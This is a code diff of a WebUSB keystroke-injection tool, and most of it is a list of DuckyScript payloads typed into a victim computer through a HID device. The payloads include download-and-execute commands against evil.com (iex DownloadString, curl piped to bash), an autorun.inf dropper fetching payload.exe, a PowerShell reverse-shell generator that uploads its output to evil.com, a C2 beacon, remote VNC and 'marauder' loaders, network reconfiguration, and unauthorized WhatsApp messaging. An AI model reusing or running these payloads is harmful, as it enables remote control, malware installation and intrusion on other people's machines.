+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Screen{ [DllImport("user32.dll")] public static extern int EnumDisplaySettings(string deviceName,int modeNum,ref DEVMODE devMode); [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE devMode,int flags); public struct DEVMODE{ [MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmPositionX; public int dmPositionY; public int dmDisplayOrientation; public int dmDisplayFixedOutput; public short dmColor; public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate; [MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)] public string dmFormName; public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight; public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent; public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2; public int dmPanningWidth; public int dmPanningHeight; }}';$dev=New-Object Screen+DEVMODE;$dev.dmSize=[System.Runtime.InteropServices.Marshal]::SizeOf($dev);[Screen]::EnumDisplaySettings($null,0,[ref]$dev);$dev.dmDisplayOrientation=1;[Screen]::ChangeDisplaySettings([ref]$dev,0)\nENTER` },
+    { id: 'blink_prank', name: 'Blink Prank', cat: 'Prank', icon: 'visibility',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING (New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}');Start-Sleep -Milliseconds 100;(New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')\nENTER` },
+    { id: 'rickroll_sing', name: 'Sing RickRoll (iOS)', cat: 'Prank', icon: 'music_note',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "Music" to play track "Never Gonna Give You Up"'\nENTER` },
+    { id: 'popup_prank', name: 'Pop Up (iOS)', cat: 'Prank', icon: 'popup',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'display dialog "You've been pranked!" buttons {"OK"} default button 1'\nENTER` },
+    { id: 'whatsapp_spam', name: 'WhatsApp Message Spam', cat: 'Prank', icon: 'message',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "WhatsApp" to send "You've been HID attacked!" to contact "Target"'\nENTER` },
+    { id: 'whatsapp_status', name: 'WhatsApp Status Change', cat: 'Prank', icon: 'edit',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "WhatsApp" to set status to "Hacked by HID!"'\nENTER` },
+    { id: 'open_website', name: 'Open Malicious Website', cat: 'Prank', icon: 'open_in_browser',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING https://evil.com\nENTER` },
+    { id: 'rickroll_linux', name: 'RickRoll (Linux)', cat: 'Prank', icon: 'music_note',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING curl -s https://raw.githubusercontent.com/keroserene/rickrollrc/master/rickroll.sh | bash\nENTER` },
+    { id: 'screenshot_format', name: 'Change Screenshot Format (iOS)', cat: 'Prank', icon: 'photo',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING osascript -e 'tell application "System Events" to set screenshot format to PNG'\nENTER` },
 
-    // ---------- অ্যাডভান্সড & C2 (61-67) ----------
-    { id: 'c2_beacon', name: 'WiFi C2 Beacon (AES-256)', cat: 'অ্যাডভান্সড', icon: 'satellite', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $key=[System.Text.Encoding]::UTF8.GetBytes('0123456789abcdef0123456789abcdef');$iv=[System.Text.Encoding]::UTF8.GetBytes('abcdef0123456789');$data='{\"host\":\"'+(Get-WmiObject Win32_ComputerSystem).Name+'\",\"user\":\"'+$env:UserName+'\"}';$aes=New-Object System.Security.Cryptography.AesCryptoServiceProvider;$aes.Key=$key;$aes.IV=$iv;$enc=$aes.CreateEncryptor();$bytes=[System.Text.Encoding]::UTF8.GetBytes($data);$encrypted=$enc.TransformFinalBlock($bytes,0,$bytes.Length);[Convert]::ToBase64String($encrypted)\nENTER` },
-    { id: 'vnc_viewer', name: 'VNC Viewer (Remote Monitor)', cat: 'অ্যাডভান্সড', icon: 'screen_share', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../vnc.ps1' -OutFile $env:TEMP\\vnc.ps1;Import-Module $env:TEMP\\vnc.ps1;Start-VNC -Port 5900 -Password P@ssw0rd\nENTER` },
-    { id: 'cross_platform_agent', name: 'Cross-Platform Agent', cat: 'অ্যাডভান্সড', icon: 'devices', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $os=(Get-WmiObject Win32_OperatingSystem).Caption;if($os -match 'Windows'){iex (New-Object Net.WebClient).DownloadString('http://evil.com/agent.ps1')}else{curl -s http://evil.com/agent.sh | bash}\nENTER` },
-    { id: 'usb_storage_spoof', name: 'USB Storage Spoofing', cat: 'অ্যাডভান্সড', icon: 'usb', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $drive='F:';New-Item -Path $drive -Name 'autorun.inf' -Value '[AutoRun];open=payload.exe;action=Open folder to view files' -Force;New-Item -Path $drive -Name 'payload.exe' -Value (Invoke-WebRequest -Uri 'http://evil.com/payload.exe').Content -Force\nENTER` },
-    { id: 'network_impersonation', name: 'Network Device Impersonation', cat: 'অ্যাডভান্সড', icon: 'router', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter -Name Ethernet).InterfaceIndex -ServerAddresses ('192.168.1.1','8.8.8.8');Set-NetIPAddress -InterfaceIndex (Get-NetAdapter -Name Ethernet).InterfaceIndex -IPAddress 192.168.1.100 -PrefixLength 24\nENTER` },
-    { id: 'wifi_bluetooth_exploit', name: 'WiFi/Bluetooth Exploits', cat: 'অ্যাডভান্সড', icon: 'bluetooth_searching', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../marauder.ps1' -OutFile $env:TEMP\\marauder.ps1;Import-Module $env:TEMP\\marauder.ps1;Start-Marauder -Mode Both\nENTER` },
-    { id: 'payload_generator', name: 'Custom Payload Generator', cat: 'অ্যাডভান্সড', icon: 'build', script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $type='reverse_shell';$ip='127.0.0.1';$port='4444';$payload=@\"\nDELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING `$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()}\nENTER\"@;$payload | Out-File C:\\temp\\payload.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\payload.txt\nENTER` },
+    // ---------- ADVANCED & C2 (7) ----------
+    { id: 'c2_beacon', name: 'WiFi C2 Beacon (AES-256)', cat: 'Advanced', icon: 'satellite',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $key=[System.Text.Encoding]::UTF8.GetBytes('0123456789abcdef0123456789abcdef');$iv=[System.Text.Encoding]::UTF8.GetBytes('abcdef0123456789');$data='{\"host\":\"'+(Get-WmiObject Win32_ComputerSystem).Name+'\",\"user\":\"'+$env:UserName+'\"}';$aes=New-Object System.Security.Cryptography.AesCryptoServiceProvider;$aes.Key=$key;$aes.IV=$iv;$enc=$aes.CreateEncryptor();$bytes=[System.Text.Encoding]::UTF8.GetBytes($data);$encrypted=$enc.TransformFinalBlock($bytes,0,$bytes.Length);[Convert]::ToBase64String($encrypted)\nENTER` },
+    { id: 'vnc_viewer', name: 'VNC Viewer (Remote Monitor)', cat: 'Advanced', icon: 'screen_share',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../vnc.ps1' -OutFile $env:TEMP\\vnc.ps1;Import-Module $env:TEMP\\vnc.ps1;Start-VNC -Port 5900 -Password P@ssw0rd\nENTER` },
+    { id: 'cross_platform_agent', name: 'Cross-Platform Agent', cat: 'Advanced', icon: 'devices',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $os=(Get-WmiObject Win32_OperatingSystem).Caption;if($os -match 'Windows'){iex (New-Object Net.WebClient).DownloadString('http://evil.com/agent.ps1')}else{curl -s http://evil.com/agent.sh | bash}\nENTER` },
+    { id: 'usb_storage_spoof', name: 'USB Storage Spoofing', cat: 'Advanced', icon: 'usb',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $drive='F:';New-Item -Path $drive -Name 'autorun.inf' -Value '[AutoRun];open=payload.exe;action=Open folder to view files' -Force;New-Item -Path $drive -Name 'payload.exe' -Value (Invoke-WebRequest -Uri 'http://evil.com/payload.exe').Content -Force\nENTER` },
+    { id: 'network_impersonation', name: 'Network Device Impersonation', cat: 'Advanced', icon: 'router',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Set-DnsClientServerAddress -InterfaceIndex (Get-NetAdapter -Name Ethernet).InterfaceIndex -ServerAddresses ('192.168.1.1','8.8.8.8');Set-NetIPAddress -InterfaceIndex (Get-NetAdapter -Name Ethernet).InterfaceIndex -IPAddress 192.168.1.100 -PrefixLength 24\nENTER` },
+    { id: 'wifi_bluetooth_exploit', name: 'WiFi/Bluetooth Exploits', cat: 'Advanced', icon: 'bluetooth_searching',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../marauder.ps1' -OutFile $env:TEMP\\marauder.ps1;Import-Module $env:TEMP\\marauder.ps1;Start-Marauder -Mode Both\nENTER` },
+    { id: 'payload_generator', name: 'Custom Payload Generator', cat: 'Advanced', icon: 'build',
+      script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $type='reverse_shell';$ip='127.0.0.1';$port='4444';$payload=@"\nDELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING `$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()}\nENTER"@;$payload | Out-File C:\\temp\\payload.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\payload.txt\nENTER` },
 ];
 
-// ---------- পেলোড লোড ----------
+// ============================================================
+// LOAD PAYLOAD CARDS
+// ============================================================
 function loadPayloads() {
+    if (!payloadGrid) return;
     payloadGrid.innerHTML = '';
     PAYLOADS.forEach(p => {
         const card = document.createElement('div');
@@ -225,67 +329,110 @@ function loadPayloads() {
         `;
         card.dataset.script = p.script;
         card.addEventListener('click', async () => {
-            if (!isConnected) { addLog('HID ডিভাইস কানেক্ট করুন!', 'error'); return; }
-            addLog(`🚀 রান: ${p.name}`, 'info');
+            if (!isConnected) {
+                addLog('Please connect HID device first!', 'error');
+                return;
+            }
+            addLog(`🚀 Running: ${p.name}`, 'info');
             await runDuckyScript(card.dataset.script);
         });
         payloadGrid.appendChild(card);
     });
+    addLog(`📦 Loaded ${PAYLOADS.length} payloads`, 'success');
 }
-loadPayloads();
-addLog(`📦 ${PAYLOADS.length}টি পেলোড লোড হয়েছে`, 'info');
 
-// ---------- WebUSB কানেক্ট ----------
+// ============================================================
+// WEBUSB CONNECT
+// ============================================================
 connectBtn.addEventListener('click', async () => {
-    if (!navigator.usb) { addLog('WebUSB সমর্থিত নয়! Chrome/Edge ব্যবহার করুন।', 'error'); return; }
+    if (!navigator.usb) {
+        addLog('WebUSB not supported! Use Chrome/Edge.', 'error');
+        return;
+    }
     try {
-        const filters = [{ classCode:3, subclassCode:1, protocolCode:1 }, { classCode:3, subclassCode:1, protocolCode:2 }];
+        const filters = [
+            { classCode: 3, subclassCode: 1, protocolCode: 1 },
+            { classCode: 3, subclassCode: 1, protocolCode: 2 }
+        ];
         const chosen = await navigator.usb.requestDevice({ filters });
         device = chosen;
         await device.open();
         const config = device.configuration || device.configurations[0];
         await device.selectConfiguration(config.configurationValue);
         const iface = config.interfaces.find(i => i.interfaceClass === 3);
-        if (!iface) throw new Error('HID ইন্টারফেস পাওয়া যায়নি');
+        if (!iface) throw new Error('HID interface not found');
         await device.claimInterface(iface.interfaceNumber);
-        for (const ep of iface.endpoints) { if (ep.direction === 'out') endpointOut = ep.endpointNumber; }
+        for (const ep of iface.endpoints) {
+            if (ep.direction === 'out') endpointOut = ep.endpointNumber;
+        }
         isConnected = true;
-        setStatus(true, 'HID অ্যাক্টিভ');
-        addLog(`✅ ডিভাইস কানেক্ট: ${device.productName || 'HID'}`, 'success');
-    } catch (e) { addLog(`❌ কানেক্ট ব্যর্থ: ${e.message}`, 'error'); setStatus(false, 'ব্যর্থ'); }
+        setStatus(true, 'HID Active');
+        addLog(`✅ Connected: ${device.productName || 'HID Device'} (VID:${device.vendorId})`, 'success');
+    } catch (e) {
+        addLog(`❌ Connection failed: ${e.message}`, 'error');
+        setStatus(false, 'Failed');
+    }
 });
 
 disconnectBtn.addEventListener('click', async () => {
-    if (device) { try { await device.close(); } catch(e) {} device = null; isConnected = false; setStatus(false, 'ডিসকানেক্টেড'); addLog('⛔ ডিসকানেক্ট', 'warning'); }
+    if (device) {
+        try { await device.close(); } catch(e) {}
+        device = null;
+        isConnected = false;
+        setStatus(false, 'Disconnected');
+        addLog('⛔ Disconnected', 'warning');
+    }
 });
 
-// ---------- এডিটর ----------
+// ============================================================
+// EDITOR CONTROLS
+// ============================================================
 runEditorBtn.addEventListener('click', async () => {
     const script = scriptEditor.value.trim();
-    if (!script) { addLog('এডিটর খালি!', 'error'); return; }
+    if (!script) { addLog('Editor is empty!', 'error'); return; }
     await runDuckyScript(script);
 });
-clearEditorBtn.addEventListener('click', () => { scriptEditor.value = ''; addLog('🗑️ ক্লিয়ার', 'warning'); });
-
-// ---------- লগ ----------
-document.getElementById('clearLog').addEventListener('click', () => { consoleBox.innerHTML = ''; addLog('🗑️ ক্লিয়ার', 'warning'); });
-document.getElementById('exportLog').addEventListener('click', () => {
-    const blob = new Blob([consoleBox.innerText], { type:'text/plain' });
-    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `hid_log_${new Date().toISOString().slice(0,10)}.txt`; a.click();
+clearEditorBtn.addEventListener('click', () => {
+    scriptEditor.value = '';
+    addLog('🗑️ Editor cleared', 'warning');
 });
 
-// ---------- নেভিগেশন ----------
+// ============================================================
+// LOG CONTROLS
+// ============================================================
+clearLogBtn.addEventListener('click', () => {
+    consoleBox.innerHTML = '';
+    addLog('🗑️ Console cleared', 'warning');
+});
+exportLogBtn.addEventListener('click', () => {
+    const blob = new Blob([consoleBox.innerText], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `hid_log_${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+    addLog('📤 Log exported', 'success');
+});
+
+// ============================================================
+// NAVIGATION
+// ============================================================
 document.querySelectorAll('nav ul li').forEach(item => {
     item.addEventListener('click', () => {
         document.querySelectorAll('nav ul li').forEach(i => i.classList.remove('active'));
         item.classList.add('active');
         const target = document.getElementById(item.id.replace('nav', '') + 'Section');
-        if (target) target.scrollIntoView({ behavior:'smooth' });
+        if (target) target.scrollIntoView({ behavior: 'smooth' });
     });
 });
 
-// ---------- সিস্টেম চেক ----------
-if (!navigator.usb) addLog('⚠️ WebUSB সমর্থিত নয়। Chrome/Edge ব্যবহার করুন।', 'error');
-else addLog('✅ WebUSB সমর্থিত', 'success');
-setStatus(false, 'ডিসকানেক্টেড');
-addLog('🔌 OTG-তে HID কীবোর্ড কানেক্ট করে "ডিভাইস কানেক্ট" ক্লিক করুন।');
+// ============================================================
+// INIT
+// ============================================================
+if (!navigator.usb) {
+    addLog('⚠️ WebUSB not supported. Use Chrome/Edge.', 'error');
+} else {
+    addLog('✅ WebUSB supported', 'success');
+}
+setStatus(false, 'Disconnected');
+addLog('🔌 Connect USB keyboard via OTG and click "Connect Device"', 'info');
+loadPayloads();
